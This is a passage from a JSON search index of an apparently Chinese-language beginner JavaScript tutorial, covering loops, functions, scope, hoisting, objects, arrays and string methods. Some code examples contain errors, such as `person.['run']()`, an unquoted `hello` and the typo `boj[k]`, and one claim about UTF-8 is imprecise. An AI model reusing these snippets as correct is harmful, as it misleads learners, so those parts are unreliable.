continue结束本次循环\",\"slug\":\"_6-continue结束本次循环\",\"contents\":[\"在循环中，把循环的本次跳过去，继续执行后续的循环\",\"比如：吃五个包子，到第三个的时候，第三个掉地下了，不吃了，跳过第三个，继续吃第四个和第五个\",\"跳过本次循环，就可以使用 continue 关键字\",\"for (var i = 1; i <= 5; i++) { // 当 i 的值为 3 的时候，执行 {} 里面的代码 // {} 里面有 continue，那么本次循环后面的代码就都不执行了 // 自动算作 i 为 3 的这一次结束了，去继续执行 i = 4 的那次循环了 if (i === 3) { console.log('这个是第三个包子，掉地下了，我不吃了') continue } console.log('我吃了一个包子') } \"]}]},\"/front-end/javascript-notes/11-JavaScript-%E5%87%BD%E6%95%B0.html\":{\"title\":\"函数\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"对于 JS 来说，函数就是把任意一段代码放在一个 盒子 里面\",\"在我想要让这段代码执行的时候，直接执行这个 盒子 里面的代码就行\",\"// 这个是我们以前写的一段代码 for (var i = 0; i < 10; i++) { console.log(i) } // 函数，这个 {} 就是那个 “盒子” function fn() { // 这个函数我们以前写的代码 for (var i = 0; i < 10; i++) { console.log(i) } } \"]},{\"header\":\"1. 函数定义阶段\",\"slug\":\"_1-函数定义阶段\",\"contents\":[\"定义阶段就是我们把代码 放在盒子里面\",\"我们就要学习怎么 放进去，也就是书写一个函数\",\"我们有两种定义方式 声明式 和 赋值式\"]},{\"header\":\"1.1 声明式\",\"slug\":\"_1-1-声明式\",\"contents\":[\"使用 function 这个关键字来声明一个函数\",\"语法：\",\"function fn() { // 一段代码,即函数体 } // function: 声明函数的关键字，表示接下来是一个函数了 // fn: 函数的名字，我们自己定义的（遵循变量名的命名规则和命名规范） // (): 必须写，是用来放参数的位置（一会我们再聊） // {}: 就是我们用来放一段代码的位置（也就是我们刚才说的 “盒子”） \"]},{\"header\":\"1.2 赋值式\",\"slug\":\"_1-2-赋值式\",\"contents\":[\"其实就是和我们使用 var 关键字是一个道理了\",\"首先使用 var 定义一个变量，把一个函数当作值直接赋值给这个变量就可以了\",\"语法：\",\"var fn = function () { // 一段代码，即函数体 } // 不需要在 function 后面书写函数的名字了，因为在前面已经有了 \"]},{\"header\":\"2. 函数调用阶段\",\"slug\":\"_2-函数调用阶段\",\"contents\":[]},{\"header\":\"2.1 函数的调用方式\",\"slug\":\"_2-1-函数的调用方式\",\"contents\":[\"就是让 盒子里面 的代码执行一下\",\"两种定义函数的方式不同，但是调用函数的方式都以一样的\",\"函数调用就是直接写 函数名() 就可以了\",\"// 声明式函数 function fn() { console.log('我是 fn 函数') } fn() // 调用函数 // 赋值式函数 var fn2 = function () { console.log('我是 fn2 函数') } fn() // 调用函数 \",\"注意：定义完一个函数以后，如果没有函数调用，那么写在 {} 里面的代码没有意义，只有调用以后才会执行\"]},{\"header\":\"2.2 调用上的区别\",\"slug\":\"_2-2-调用上的区别\",\"contents\":[\"虽然两种定义方式的调用都是一样的，但是还是有一些区别的\",\"声明式函数： 调用可以在定义之前或者定义之后\",\"fn() // 可以调用 // 声明式函数 function fn() { console.log('我是 fn 函数') } fn() // 可以调用 \",\"赋值式函数： 调用只能在定义之后\",\"fn() // 会报错 // 赋值式函数 var fn = function () { console.log('我是 fn 函数') } fn() // 可以调用 \"]},{\"header\":\"3. 函数的参数\",\"slug\":\"_3-函数的参数\",\"contents\":[\"我们在定义函数和调用函数的时候都出现过 ()，现在我们就来说一下这个 () 的作用，就是用来放参数的\",\"参数分为两种 形参 和 实参\",\"// 声明式 function fn(形参写在这里) { // 一段代码 } fn(实参写在这里) // 赋值式函数 var fn = function (形参写在这里) { // 一段代码 } fn(实参写在这里) \"]},{\"header\":\"3.1 形参和实参的作用\",\"slug\":\"_3-1-形参和实参的作用\",\"contents\":[]},{\"header\":\"3.1.1 形参\",\"slug\":\"_3-1-1-形参\",\"contents\":[\"形参就是在函数内部可以使用的变量，在函数外部不能使用，每写一个单词，就相当于在函数内部定义了一个可以使用的变量（遵循变量名的命名规则和命名规范），多个单词之间以 , 分隔，如果只有形参的话，那么在函数内部使用的这个变量是没有值的，也就是 undefined\",\"注意：形参的值是在函数调用的时候由实参决定的\",\"// 书写一个参数 function fn(num) { // 在函数内部就可以使用 num 这个变量 } var fn1 = function (num) { // 在函数内部就可以使用 num 这个变量 } // 书写两个参数 function fun(num1, num2) { // 在函数内部就可以使用 num1 和 num2 这两个变量 } var fun1 = function (num1, num2) { // 在函数内部就可以使用 num1 和 num2 这两个变量 } \"]},{\"header\":\"3.1.2 实参\",\"slug\":\"_3-1-2-实参\",\"contents\":[\"在函数调用的时候给形参赋值的，也就是说，在调用的时候是给一个实际的内容的\",\"function fn(num) { // 函数内部可以使用 num } // 这个函数的本次调用，书写的实参是 100 // 那么本次调用的时候函数内部的 num 就是 100 fn(100) // 这个函数的本次调用，书写的实参是 200 // 那么本次调用的时候函数内部的 num 就是 200 fn(200) \",\"函数内部的形参的值，由函数调用的时候传递的实参决定，多个参数的时候，是按照顺序一一对应的\",\"function fn(num1, num2) { // 函数内部可以使用 num1 和 num2 } // 函数本次调用的时候，书写的参数是 100 和 200 // 那么本次调用的时候，函数内部的 num1 就是 100，num2 就是 200 fn(100, 200) \"]},{\"header\":\"3.2 参数个数的关系\",\"slug\":\"_3-2-参数个数的关系\",\"contents\":[\"形参比实参少\",\"因为是按照顺序一一对应的\",\"形参少就会拿不到实参给的值，所以在函数内部就没有办法用到这个值\",\"function fn(num1, num2) { // 函数内部可以使用 num1 和 num2 } // 本次调用的时候，传递了两个实参，100 200 和 300 // 100 对应了 num1，200 对应了 num2，300 没有对应的变量 // 所以在函数内部就没有办法依靠变量来使用 300 这个值 fn(100, 200, 300) \",\"形参比实参多\",\"因为是按照顺序一一对应的\",\"所以多出来的形参就是没有值的，就是 undefined\",\"function fn(num1, num2, num3) { // 函数内部可以使用 num1 num2 和 num3 } // 本次调用的时候，传递了两个实参，100 和 200 // 就分别对应了 num1 和 num2 // 而 num3 没有实参和其对应，那么 num3 的值就是 undefined fn(100, 200) \"]},{\"header\":\"3.3 arguments对象\",\"slug\":\"_3-3-arguments对象\",\"contents\":[\"函数内 arguments 表示它接收到的实参列表，它是一个类数组对象\",\"类数组对象：所有属性均为从 0 开始的自然数序列，并且有 length 属性，和数组类似可以用方括号书写下标访问对象的某个属性值，但是不能调用数组的方法\",\"数组的方法详见数组篇\",\"function fun() { console.log(arguments) // 11 22 33 44 console.log(arguments[0]) // 11 console.log(arguments[1]) // 22 console.log(arguments[9]) // undefined } fun(11, 22, 33, 44) \"]},{\"header\":\"4. 函数的return\",\"slug\":\"_4-函数的return\",\"contents\":[\"return 返回的意思，其实就是给函数一个 返回值 和 终断函数\"]},{\"header\":\"4.1 返回值\",\"slug\":\"_4-1-返回值\",\"contents\":[\"函数调用本身也是一个表达式，表达式就应该有一个值出现，现在的函数执行完毕之后，是不会有结果出现的\",\"// 比如 1 + 2 是一个表达式，那么 这个表达式的结果就是 3 console.log(1 + 2) // 3 function fn() { // 执行代码 } // fn() 也是一个表达式，这个表达式就没有结果出现 console.log(fn()) // undefined \",\"return 关键字就是可以给函数执行完毕一个结果，我们可以在函数内部使用 return 把任何内容当作这个函数运行后的结果\",\"function fn() { // 执行代码 return 100 } // 此时，fn() 这个表达式执行完毕之后就有结果出现了 console.log(fn()) // 100 \"]},{\"header\":\"4.2 终断函数\",\"slug\":\"_4-2-终断函数\",\"contents\":[\"当我开始执行函数以后，函数内部的代码就会从上到下的依次执行，必须要等到函数内的代码执行完毕，而 return 关键字就是可以在函数中间的位置停掉，让后面的代码不在继续执行\",\"function fn() { console.log(1) console.log(2) console.log(3) // 写了 return 以后，后面的 4 和 5 就不会继续执行了 return console.log(4) console.log(5) } // 函数调用 fn() \"]},{\"header\":\"5. 作用域\",\"slug\":\"_5-作用域\",\"contents\":[\"变量不是在所有地方都可以使用的，而这个变量的使用范围就是作用域\"]},{\"header\":\"5.1 全局作用域\",\"slug\":\"_5-1-全局作用域\",\"contents\":[\"全局作用域是最大的作用域\",\"在全局作用域中定义的变量可以在任何地方使用\",\"页面打开的时候，浏览器会自动给我们生成一个全局作用域 window\",\"这个作用域会一直存在，直到页面关闭就销毁了\",\"// 下面两个变量都是存在在全局作用域下面的，都是可以在任意地方使用的 var num = 100 var num2 = 200 \"]},{\"header\":\"5.2 局部作用域\",\"slug\":\"_5-2-局部作用域\",\"contents\":[\"局部作用域就是在全局作用域下面有开辟出来的一个相对小一些的作用域\",\"在局部作用域中定义的变量只能在这个局部作用域内部使用\",\"在 JS 中只有函数能生成一个局部作用域，别的都不行\",\"每一个函数，都是一个局部作用域\",\"// 这个 num 是一个全局作用域下的变量 在任何地方都可以使用 var num = 100 function fn() { // 下面这个变量就是一个 fn 局部作用域内部的变量 // 只能在 fn 函数内部使用 var num2 = 200 } fn() \"]},{\"header\":\"6. 变量使用规则\",\"slug\":\"_6-变量使用规则\",\"contents\":[\"有了作用域以后，变量就有了使用范围，也就有了使用规则，变量使用规则分为两种，访问规则 和 赋值规则\"]},{\"header\":\"6.1 访问规则\",\"slug\":\"_6-1-访问规则\",\"contents\":[\"当我想获取一个变量的值的时候，我们管这个行为叫做访问\",\"获取变量的规则：\",\"首先，在自己的作用域内部查找，如果有，就直接拿来使用\",\"如果没有，就去上一级作用域查找，如果有，就拿来使用\",\"如果没有，就继续去上一级作用域查找，依次类推\",\"如果一直到全局作用域都没有这个变量，那么就会直接报错（该变量 is not defined）\",\"var num = 100 function fn() { var num2 = 200 function fun() { var num3 = 300 console.log(num3) // 自己作用域内有，拿过来用 console.log(num2) // 自己作用域内没有，就去上一级，就是 fn 的作用域里面找，发现有，拿过来用 console.log(num) // 自己这没有，去上一级 fn 那里也没有，再上一级到全局作用域，发现有，直接用 console.log(a) // 自己没有，一级一级找上去到全局都没有，就会报错 } fun() } fn() \",\"变量的访问规则 也叫做作用域的查找机制，作用域的查找机制只能是向上找，不能向下找\",\"function fn() { var num = 100 } fn() console.log(num) // 发现自己作用域没有，自己就是全局作用域，没有再上一级了，直接报错 \"]},{\"header\":\"6.2 赋值规则\",\"slug\":\"_6-2-赋值规则\",\"contents\":[\"当你想给一个变量赋值的时候，那么就先要找到这个变量，再给它赋值\",\"变量赋值规则：\",\"先在自己作用域内部查找，有就直接赋值\",\"没有就去上一级作用域内部查找，有就直接赋值\",\"还没有再去上一级作用域查找，有就直接赋值\",\"如果一直找到全局作用域都没有，那么就把这个变量定义为全局变量，再给他赋值\",\"function fn() { num = 100 } fn() // fn 调用以后，要给 num 赋值 // 查看自己的作用域内部没有 num 变量 // 就会向上一级查找 // 上一级就是全局作用域，发现依旧没有 // 那么就会把 num 定义为全局的变量，并为其赋值 // 所以 fn() 以后，全局就有了一个变量叫做 num 并且值是 100 console.log(num) // 100 \"]},{\"header\":\"7. 函数提升\",\"slug\":\"_7-函数提升\",\"contents\":[\"声明式函数：会把所有函数声明提升到当前作用域的最前面，只提升函数声明，不提升函数调用\",\"例：\",\"以下代码\",\"fn() console.log(num) function fn() { console.log('我是 fn 函数') } var num = 100 \",\"经过预解析之后可以变形为\",\"function fn() { console.log('我是 fn 函数') } var num fn() console.log(num) num = 100 \",\"赋值式函数会按照 var 关键字的规则进行预解析\"]},{\"header\":\"8. 立即执行函数\",\"slug\":\"_8-立即执行函数\",\"contents\":[\"避免全局变量之间的污染\",\"(function(){ xxx })(); ;(function(){ xxx })() ！function(){ xxx }() (function(){xxxx}()); \",\"无需调用，立即执行，其实本质已经调用了\",\"多个立即执行函数之间用分号隔开\"]},{\"header\":\"9.this\",\"slug\":\"_9-this\",\"contents\":[\"每一个函数内部都有一个关键字是 this ，可以让我们直接使用的\",\"后面会详述\"]}]},\"/front-end/javascript-notes/12-JavaScript-%E5%AF%B9%E8%B1%A1.html\":{\"title\":\"对象\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"对象是一个复杂数据类型\",\"事实上没有很复杂，只不过是存储了一些基本数据类型的一个集合\",\"var obj = { num: 100, str: 'hello world', boo: true } \",\"这里的 {} 和函数中的 {} 不一样，函数里面的是写代码的，而对象里面是写一些数据的，对象就是一个键值对的集合，{} 里面的每一个键都是一个成员，也就是说，我们可以把一些数据放在一个对象里面，那么他们就互不干扰了，其实就是我们准备一个房子，把我们想要的数据放进去，然后把房子的地址给到变量名，当我们需要某一个数据的时候，就可以根据变量名里面存储的地址找到对应的房子，然后去房子里面找到对应的数据\"]},{\"header\":\"1. 创建对象\",\"slug\":\"_1-创建对象\",\"contents\":[\"字面量的方式创建一个对象\",\"// 创建一个空对象 var obj = {} // 像对象中添加成员 obj.name = 'Jack' obj.age = 18 \",\"内置构造函数的方式创建对象\",\"// 创建一个空对象 var obj = new Object() // 向对象中添加成员 obj.name = 'Rose' obj.age = 20 \",\"Object 是 js 内置给我们的构造函数，用于创建一个对象使用的\"]},{\"header\":\"2. 属性和访问\",\"slug\":\"_2-属性和访问\",\"contents\":[\"数据描述性的信息称为属性，如人的姓名、身高、年龄、性别等，一般是名词性的\",\"属性都是成对出现的，包括属性名和值，它们之间使用英文 : 分隔\",\"多个属性之间使用英文 , 分隔\",\"属性就是依附在对象上的变量\",\"属性名可以使用 \\\"\\\" 或 ''，一般情况下省略，除非名称遇到特殊符号如空格、中横线等\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 对象语法</title> </head> <body> <script> // 通过对象描述一个人的数据信息 // person 是一个对象，它包含了一个属性 name // 属性都是成对出现的，属性名 和 值，它们之间使用英文 : 分隔 var person = { name: '小明', // 描述人的姓名 age: 18, // 描述人的年龄 stature: 185, // 描述人的身高 gender: '男', // 描述人的性别 } </script> </body> </html> \",\"声明对象，并添加了若干属性后，可以使用 . 或 对象名['属性'] 方式也可以访问 获得对象中属性对应的值，称之为属性访问\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 对象语法</title> </head> <body> <script> // 通过对象描述一个人的数据信息 // person 是一个对象，它包含了一个属性 name // 属性都是成对出现的，属性名 和 值，它们之间使用英文 : 分隔 var person = { name: '小明', // 描述人的姓名 age: 18, // 描述人的年龄 stature: 185, // 描述人的身高 gender: '男', // 描述人的性别 }; // 访问人的名字 console.log(person.name) // 结果为 小明 // 访问人性别 console.log(person.gender) // 结果为 男 // 访问人的身高 console.log(person['stature']) // 结果为 185 // 或者 console.log(person.stature) // 结果同为 185 </script> </body> </html> \",\"var person = { 'user-name': 'pink', age: 18, gender: '女', } console.log(person['user-name'])//pink console.log(person['age'])//18 \",\"扩展：也可以动态为对象添加属性，动态添加与直接定义是一样的，只是语法上更灵活\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 对象语法</title> </head> <body> <script> // 声明一个空的对象（没有任何属性） var user = {} // 动态追加属性 user.name = '小明' user['age'] = 18 // 动态添加与直接定义是一样的，只是语法上更灵活 </script> </body> </html> \",\"删除属性：delete 对象名.属性\",\"var person = { uname: 'pink', age: 18, gender: '女', } delete person.gender \"]},{\"header\":\"3. 方法和调用\",\"slug\":\"_3-方法和调用\",\"contents\":[\"数据行为性的信息称为方法，如跑步、唱歌等，一般是动词性的，其本质是函数\",\"方法是由方法名和函数两部分构成，它们之间使用 : 分隔\",\"多个属性之间使用英文 , 分隔\",\"方法是依附在对象中的函数\",\"方法名可以使用 \\\"\\\" 或 ''，一般情况下省略，除非名称遇到特殊符号如空格、中横线等\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 对象方法</title> </head> <body> <script> // 方法是依附在对象上的函数 var person = { name: '小红', age: 18, // 方法是由方法名和函数两部分构成，它们之间使用 : 分隔 singing: function () { console.log('两只老虎，两只老虎，跑的快，跑的快...') }, run: function () { console.log('我跑的非常快...') } } </script> </body> </html> \",\"声明对象，并添加了若干方法后，可以使用 . 或 对象名['方法'()] 方式也可以访问调用对象中函数，称为方法调用\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 对象方法</title> </head> <body> <script> // 方法是依附在对象上的函数 var person = { name: '小红', age: 18, // 方法是由方法名和函数两部分构成，它们之间使用 : 分隔 singing: function () { console.log('两只老虎，两只老虎，跑的快，跑的快...') }, run: function () { console.log('我跑的非常快...') } } // 调用对象中 singing 方法 person.singing() // 调用对象中的 run 方法 person.['run']() </script> </body> </html> \",\"扩展：也可以动态为对象添加方法，动态添加与直接定义是一样的，只是语法上更灵活\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>JavaScript 基础 - 对象方法</title> </head> <body> <script> // 声明一个空的对象（没有任何属性，也没有任何方法） var user = {} // 动态追加属性 user.name = '小明' user.['age'] = 18 // 动态添加方法 user.move = function () { console.log('移动一点距离...') } </script> </body> </html> \",\"注：无论是属性或是方法，同一个对象中出现名称一样的，后面的会覆盖前面的\"]},{\"header\":\"4. null\",\"slug\":\"_4-null\",\"contents\":[\"null 也是 JavaScript 中数据类型的一种，通常只用它来表示不存在的对象。使用 typeof 检测类型它的类型时，结果为 object\"]},{\"header\":\"5. 遍历对象\",\"slug\":\"_5-遍历对象\",\"contents\":[\"var obj = { uname: 'pink', age: 18, address: '北京', } for(var k in obj) { // k 是属性名，是一个字符串，带引号 obj.uname才可以取到数据，但是这里，k==='uname'，所以obj.k取不到数据，obj[k]才可以取到属性值，即obj['uname'] console.log(obj[k]) } // 结果是 pink 18 北京 \",\"for in 不提倡遍历数组因为 k 是字符串\",\"var obj = { uname: 'andy', age: 18, sex: '男', } for(var k in obj){ console.log(k) //打印属性名 console.log(boj[k]) //打印属性值 } \",\"注意：k 是获得对象的 属性名，对象名[k] 是获得 属性值\"]},{\"header\":\"6. 常用方法\",\"slug\":\"_6-常用方法\",\"contents\":[\"Object.keys(o) 获取o对象的所有key组成的数组\"]}]},\"/front-end/javascript-notes/13-JavaScript-%E6%95%B0%E7%BB%84.html\":{\"title\":\"数组\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"数组字面理解就是数字的组合，准确的来说数组是一个数据的集合\",\"也就是我们把一些数据放在一个盒子里面，按照顺序排好\",\"[1, 2, 3, 'hello', true, false] \"]},{\"header\":\"1. 创建数组\",\"slug\":\"_1-创建数组\",\"contents\":[]},{\"header\":\"1.1 字面量创建数组\",\"slug\":\"_1-1-字面量创建数组\",\"contents\":[\"直接使用 [] 的方式创建一个数组\",\"// 创建一个空数组 var arr1 = [] // 创建一个有内容的数组 var arr2 = [1, 2, 3] \"]},{\"header\":\"1.2 内置构造函数创建数组\",\"slug\":\"_1-2-内置构造函数创建数组\",\"contents\":[\"使用 JS 的内置构造函数 Array 创建一个数组\",\"// 创建一个空数组 var arr1 = new Array() // 创建一个长度为 10 的数组 var arr2 = new Array(10) // 创建一个有内容的数组 var arr3 = new Array(1, 2, 3) \"]},{\"header\":\"2. 数组的长度\",\"slug\":\"_2-数组的长度\",\"contents\":[\"length 表示数组的长度，数组里面有多少个成员，length 就是多少\",\"// 创建一个数组 var arr = [1, 2, 3] console.log(arr.length) // 3 \"]},{\"header\":\"3. 数组的索引\",\"slug\":\"_3-数组的索引\",\"contents\":[\"索引，也叫做下标，是指一个数据在数组里面排在第几个的位置\",\"注意： 在所有的语言里面，索引都是从 0 开始的，在 JS 里面也一样，数组的索引从 0 开始\",\"// 创建一个数组 var arr = ['hello', 'world'] \",\"上面这个数组中，第 0 个 数据就是字符串 hello，第 1 个 数据就是字符串 world，想获取数组中的第几个就使用 数组[索引] 来获取\",\"var arr = ['hello', 'world'] console.log(arr[0]) // hello console.log(arr[1]) // world \"]},{\"header\":\"4. 数组的常用方法\",\"slug\":\"_4-数组的常用方法\",\"contents\":[]},{\"header\":\"4.1 push\",\"slug\":\"_4-1-push\",\"contents\":[\"push 是用来在数组的末尾追加一个元素\",\"var arr = [1, 2, 3] // 使用 push 方法追加一个元素在末尾 arr.push(4) console.log(arr) // [1, 2, 3, 4] \"]},{\"header\":\"4.2 pop\",\"slug\":\"_4-2-pop\",\"contents\":[\"pop 是用来删除数组末尾的一个元素\",\"var arr = [1, 2, 3] // 使用 pop 方法删除末尾的一个元素 arr.pop() console.log(arr) // [1, 2] \"]},{\"header\":\"4.3 unshift\",\"slug\":\"_4-3-unshift\",\"contents\":[\"unshift 是在数组的最前面添加一个元素\",\"var arr = [1, 2, 3] // 使用 unshift 方法想数组的最前面添加一个元素 arr.unshift(4) console.log(arr) // [4, 1, 2, 3] \"]},{\"header\":\"4.4 shift\",\"slug\":\"_4-4-shift\",\"contents\":[\"shift 是删除数组最前面的一个元素\",\"var arr = [1, 2, 3] // 使用 shift 方法删除数组最前面的一个元素 arr.shift() console.log(arr) // [2, 3] \"]},{\"header\":\"4.5 splice\",\"slug\":\"_4-5-splice\",\"contents\":[\"splice 是截取数组中的某些内容，按照数组的索引来截取\",\"语法： splice(从哪一个索引位置开始，截取多少个，替换的新元素) （第三个参数可以不写）\",\"var arr = [1, 2, 3, 4, 5] // 使用 splice 方法截取数组 arr.splice(1, 2) console.log(arr) // [1, 4, 5] \",\"arr.splice(1, 2) 表示从索引 1 开始截取 2 个内容，第三个参数没有写，就是没有新内容替换掉截取位置\",\"var arr = [1, 2, 3, 4, 5] // 使用 splice 方法截取数组 arr.splice(1, 2, '我是新内容') console.log(arr) // [1, '我是新内容', 4, 5] \",\"arr.splice(1, 2, '我是新内容') 表示从索引 1 开始截取 2 个内容，然后用第三个参数把截取完空出来的位置填充\"]},{\"header\":\"4.6 reverse\",\"slug\":\"_4-6-reverse\",\"contents\":[\"reverse 是用来反转数组使用的\",\"var arr = [1, 2, 3] // 使用 reverse 方法来反转数组 arr.reverse() console.log(arr) // [3, 2, 1] \"]},{\"header\":\"4.7 sort\",\"slug\":\"_4-7-sort\",\"contents\":[\"sort 是用来给数组排序的\",\"var arr = [2, 3, 1] // 使用 sort 方法给数组排序 arr.sort() console.log(arr) // [1, 2, 3] \"]},{\"header\":\"4.8 concat\",\"slug\":\"_4-8-concat\",\"contents\":[\"concat 是把多个数组进行拼接\",\"和之前的方法有一些不一样的地方，就是 concat 不会改变原始数组，而是返回一个新的数组\",\"var arr = [1, 2, 3] // 使用 concat 方法拼接数组 var newArr = arr.concat([4, 5, 6]) console.log(arr) // [1, 2, 3] console.log(newArr) // [1, 2, 3, 4, 5, 6] \",\"注意： concat 方法不会改变原始数组\"]},{\"header\":\"4.9 join\",\"slug\":\"_4-9-join\",\"contents\":[\"join 是把数组里面的每一项内容链接起来，变成一个字符串，可以自己定义每一项之间链接的内容 join(要以什么内容链接)，不会改变原始数组，而是把链接好的字符串返回\",\"var arr = [1, 2, 3] // 使用 join 链接数组 var str = arr.join('-') console.log(arr) // [1, 2, 3] console.log(str) // 1-2-3 \",\"注意： join 方法不会改变原始数组，而是返回链接好的字符串\"]},{\"header\":\"4.10 indexOf\",\"slug\":\"_4-10-indexof\",\"contents\":[\"indexOf 用来找到数组中某一项的索引\",\"语法： indexOf(你要找的数组中的项)\",\"var arr = [1, 2, 3, 4, 5] // 使用 indexOf 超找数组中的某一项 var index = arr.indexOf(3) console.log(index) // 2 \",\"我们要找的是数组中值为 3 的那一项，返回的就是值为 3 的那一项在该数组中的索引，如果你要找的内容在数组中没有，那么就会返回 -1\",\"var arr = [1, 2, 3, 4, 5] // 使用 indexOf 超找数组中的某一项 var index = arr.indexOf(10) console.log(index) // -1 \",\"你要找的值在数组中不存在，那么就会返回 -1\"]},{\"header\":\"4.11 forEach\",\"slug\":\"_4-11-foreach\",\"contents\":[\"和 for 循环一个作用，就是用来遍历数组的\",\"语法：arr.forEach(function (item, index, arr) {})\",\"var arr = [1, 2, 3] // 使用 forEach 遍历数组 arr.forEach(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 console.log('数组的第 ' + index + ' 项的值是 ' + item + '，原始数组是', arr) }) \",\"forEach() 的时候传递的那个函数，会根据数组的长度执行，数组的长度是多少，这个函数就会执行多少回\"]},{\"header\":\"4.12 map\",\"slug\":\"_4-12-map\",\"contents\":[\"和 forEach 类似，只不过可以对数组中的每一项进行操作，返回一个新的数组，用于处理数据\",\"var arr = [1, 2, 3] // 使用 map 遍历数组 var newArr = arr.map(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 return item + 10 }) console.log(newArr) // [11, 12, 13] \"]},{\"header\":\"4.13 filter\",\"slug\":\"_4-13-filter\",\"contents\":[\"和 map 的使用方式类似，按照我们的条件来筛选数组，把原始数组中满足条件的筛选出来，组成一个新的数组返回，如果没有符合条件的元素则返回空数组，它不会影响原数组\",\"var arr = [1, 2, 3] // 使用 filter 过滤数组 var newArr = arr.filter(function (item, index, arr) { // item 就是数组中的每一项 // index 就是数组的索引 // arr 就是原始数组 return item > 1 //筛选条件 }) console.log(newArr) // [2, 3] \",\"我们设置的条件就是 > 1，返回的新数组就会是原始数组中所有 > 1 的项\"]}]},\"/front-end/javascript-notes/14-JavaScript-%E5%AD%97%E7%AC%A6%E4%B8%B2.html\":{\"title\":\"字符串\",\"contents\":[{\"header\":\"1. 创建字符串\",\"slug\":\"_1-创建字符串\",\"contents\":[\"我们创建字符串也分为两种方法 字面量 和 构造函数\"]},{\"header\":\"1.1 字面量\",\"slug\":\"_1-1-字面量\",\"contents\":[\"var str = 'hello' \"]},{\"header\":\"1.2 构造函数创建\",\"slug\":\"_1-2-构造函数创建\",\"contents\":[\"var str = new String('hello') \"]},{\"header\":\"2. 字符集\",\"slug\":\"_2-字符集\",\"contents\":[]},{\"header\":\"2.1 ASCII 字符集\",\"slug\":\"_2-1-ascii-字符集\",\"contents\":[\"我们都知道，计算机只能存储 0101010 这样的二进制数字，那么我们的 a ~ z 、A ~ Z 、$ 、@ 之类的内容也有由二进制数字组成的，我们可以简单的理解为， a ~ z 、 A ~ Z、 $ 、 @之类的内容都有一个自己的编号，然后在计算机存储的时候，是存储的这些编号，我们看的时候，也是通过这些编号再解析成我们要看到的内容\"]},{\"header\":\"2.1 unicode 编码\",\"slug\":\"_2-1-unicode-编码\",\"contents\":[\"我们看到了，ASCII 只有这 128 个字符的编码结构，但是因为 ASCII 出现的比较早，而且是美国发明的，早先时候这些内容就够用了，因为存储一些英文的内容，传递一些英文的文章什么的都够用了，那么对于这个世界来说肯定是不够用的，因为我们的汉字没有办法存储，包括一些其他国家的语言也没有办法存储，所以就出现了 unicode 编码，也叫（万国码，统一码），unicode 对照表就是一个和 ASCII 一样的对照表，只不过变得很大很大，因为存储的内容特别的多，而且包含了世界上大部分国家的文字，所以我们的文字和字符现在在存储的时候，都是按照 unicode 编码转换成数字进行存储，我们的 UTF-8 就是一种 8 位的 unicode 字符集\"]},{\"header\":\"3. 字符串的常用方法\",\"slug\":\"_3-字符串的常用方法\",\"contents\":[\"字符串和数组有一个相同的特点，即字符串也是按照索引来排列的\"]},{\"header\":\"3.1 charAt\",\"slug\":\"_3-1-charat\",\"contents\":[\"charAt(索引) 是找到字符串中指定索引位置的内容并返回\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charAt(2) console.log(index) // c \",\"因为字符串也是按照索引进行排列的，也是同样从 0 开始，所以索引 2 的位置就是 c\",\"如果没有对应的索引，那么就会返回 空字符串\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charAt(10) console.log(index) // '' \",\"这个字符串根本没有索引 10 的位置，所以就会返回一个空字符串 ''\"]},{\"header\":\"3.2 charCodeAt\",\"slug\":\"_3-2-charcodeat\",\"contents\":[\"charCodeAt(索引) 就是返回对应索引位置的 unicode 编码\",\"var str = 'Jack' // 使用 charAt 找到字符串中的某一个内容 var index = str.charCodeAt(0) console.log(index) // 74 \",\"因为 J 在 unicode 对照表里面存储的是 74，所以就会返回 74\"]},{\"header\":\"3.3 indexOf\",\"slug\":\"_3-3-indexof\",\"contents\":[\"indexOf 就是按照字符找到对应的索引\",\"var str = 'Jack' // 使用 indexOf 找到对应的索引 var index = str.indexOf('J') console.log(index) // 0 \",\"因为字符 J 在字符串 Jack 中的索引位置是 0，所以会返回 0\"]},{\"header\":\"3.4 substring\",\"slug\":\"_3-4-substring\",\"contents\":[\"substring 是用来截取字符串使用的\",\"语法： substring(从哪个索引开始，到哪个索引截止)，包含开始索引，不包含结束索引\",\"var str = 'hello' // 01234 // 使用 substring 截取字符串 var newStr = str.substring(1, 3) console.log(newStr) // el \",\"从索引 1 开始，到索引 3 截止，包含前面的索引不包含后面的索引，所以返回的是 el\"]},{\"header\":\"3.5 substr\",\"slug\":\"_3-5-substr\",\"contents\":[\"substr 也是用来截取字符串的\",\"语法：substr(从哪个索引开始，截取多少个)\",\"var str = 'hello' // 01234 // 使用 substr 截取字符串 var newStr = str.substr(1, 3) console.log(newStr) // ell \",\"这个方法和 substring 不一样的是，第二个参数是截取多少个，从索引 1 开始，截取 3 个，所以得到的是 ell\"]},{\"header\":\"3.6 toLowerCase和toUpperCase\",\"slug\":\"_3-6-tolowercase和touppercase\",\"contents\":[\"这两个方法分别使用用来给字符串转成 小写字母 和 大写字母 的\",\"var str = hello // 使用 toUpperCase 转换成大写 var upper = str.toUpperCase() console.log(upper) // HELLO // 使用 toLowerCase 转换成小写 var lower = upper.toLowerCase() console.log(lower) // hello \"]},{\"header\":\"3.7 split\",\"slug\":\"_3-7-split\",\"contents\":[\"split()方法用于把一个字符串分割成字符串数组\",\"语法：\",\"string.split(separator,limit) 